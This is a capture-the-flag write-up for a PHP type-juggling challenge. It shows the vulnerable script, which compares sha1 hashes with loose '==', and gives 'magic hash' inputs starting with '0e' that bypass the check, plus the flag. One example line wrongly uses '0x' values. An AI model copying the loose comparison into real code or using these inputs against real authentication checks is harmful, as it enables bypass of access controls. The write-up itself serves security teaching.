# What does clowns do at the circus?

Author: [Ting Hui](https://github.com/ChanTingHui)

## Description

PHP type juggling vulnerability

## Requirements

- PHP
- Docker: [Dockerfile](./Dockerfile)

## Sources

```
find the vulnerability or u gonna waste a lot of time ====, == or =
```

## Exploit
From `index.php`, you can see the default codes.

```php
<?php

if (isset($_GET['hash'])) {
    if ($_GET['hash'] === "10932435112") {
        die('you think it is this easy???.');
    }

    $hash = sha1($_GET['hash']);
    $target = sha1(10932435112);
    if($hash == $target) {
        include('flag.php');
        print $flag;
    } else {
        print "wssqrctf{loser_tryharder}";
    }
} else {
    show_source(__FILE__);
}

?>
```
Firstly, you can see that its requires a match of `hash` and `target`. From there u can see a vulnerability as the comparison of `$hash` and the `$target` and it uses `==` instead of `===` as `==` prompt a vulnerability to type juggling as it does not check the types, instead they are treated as numbers.
For example,
```
'0x123' == '0x845' is true
'0x123' === '0x845' is false
```
Better understanding at:
https://git.linuxtrack.net/Azgarech/PayloadsAllTheThings/blob/master/PHP%20juggling%20type/README.md1'

Hence, the hash `10932435112` starts with `0e....`, which means any hashes that starts with `0e` will match with the hash. By doing a semi brute force u will be able to find numerous matches of hashes which starts with `0e`.

```
aaroZmOk
aaK1STfY
aaO8zKZF
...
```
Next, pass any hashes into the GET pram at IP:port/?hash=aaroZmOk adnd you will get your flag.
<br />

The flag is:
```
wssqrctf{typ3_juGGl1ng}
```
